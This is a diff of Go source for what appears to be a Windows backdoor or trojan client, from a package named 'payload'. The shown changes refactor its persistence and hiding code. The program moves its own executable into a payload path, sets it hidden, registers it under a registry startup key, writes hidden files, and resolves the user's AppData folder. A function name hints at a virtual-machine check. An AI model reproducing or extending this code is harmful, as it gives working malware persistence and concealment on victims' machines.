@@ -6,6 +6,7 @@ import (
 	"net/http"
 	"os"
 	"os/exec"
+	"os/user"
 	conf "payload/config"
 	"strconv"
 	"strings"
@@ -18,6 +19,7 @@ import (
 type FileInf struct {
 	FileName string
 	FileData string
+	NNAME    string
 }
 
 func Argument(command, cut string, args int) string {
@@ -29,7 +31,7 @@ func Argument(command, cut string, args int) string {
 	return recv[args]
 }
 
-func hiddenAttribute(path string) {
+func HiddenAttribute(path string) {
 	utf16file, err := syscall.UTF16PtrFromString(path)
 	if err != nil {
 		log.Panic(err)
@@ -63,30 +65,34 @@ func registryKey(regisPath string) registry.Key {
 }
 
 func (f *FileInf) Startup() {
-	os.Rename(os.Args[0], conf.PAYLOAD_PATH+conf.NNAME)
-	hiddenAttribute(conf.PAYLOAD_PATH + conf.NNAME)
-	if err := registryKey(conf.HKEY_STARTUP).SetStringValue(f.FileName, conf.PAYLOAD_PATH+conf.NNAME); err != nil {
-		log.Fatal(err)
+	os.Rename(os.Args[0], conf.PAYLOAD_PATH+f.NNAME)
+	HiddenAttribute(conf.PAYLOAD_PATH + f.NNAME)
+	if err := registryKey(conf.HKEY_STARTUP).SetStringValue(f.FileName, conf.PAYLOAD_PATH+f.NNAME); err != nil {
+		log.Panic(err)
 	}
 }
 
-func (f *FileInf) createFile() {
+func (f *FileInf) createFile() (*os.File, error) {
 	cfile, err := os.Create(f.FileName)
 	if err != nil {
 		log.Panic(err)
 	}
-	defer cfile.Close()
-	writer := bufio.NewWriter(cfile)
-	if _, err = writer.WriteString(f.FileData); err != nil {
-		log.Panic(err)
-	}
-	writer.Flush()
+	return cfile, err
 }
 
 func (f *FileInf) OverSizeData() string {
 	if len(f.FileData) > 500 {
-		f.createFile()
-		hiddenAttribute(f.CurrentPath() + "\\" + f.FileName)
+		cfile, err := f.createFile()
+		if err != nil {
+			log.Panic(err)
+		}
+		writer := bufio.NewWriter(cfile)
+		if _, err = writer.WriteString(f.FileData); err != nil {
+			log.Panic(err)
+		}
+		writer.Flush()
+
+		HiddenAttribute(f.CurrentPath() + "\\" + f.FileName)
 
 		return "Creating file for oversize characters...\n\n" +
 			"File Name: " + f.FileName + "\n" +
@@ -102,6 +108,14 @@ func (f *FileInf) CurrentPath() string {
 		log.Panic(err)
 	}
 	return path
+}
+
+func CurrentUser() string {
+	user, err := user.Current()
+	if err != nil {
+		log.Panic(err)
+	}
+	return "C:\\Users\\" + Argument(user.Username, "\\", 1) + "\\AppData\\"
 }
 
 func (f *FileInf) RuntimeVM() {
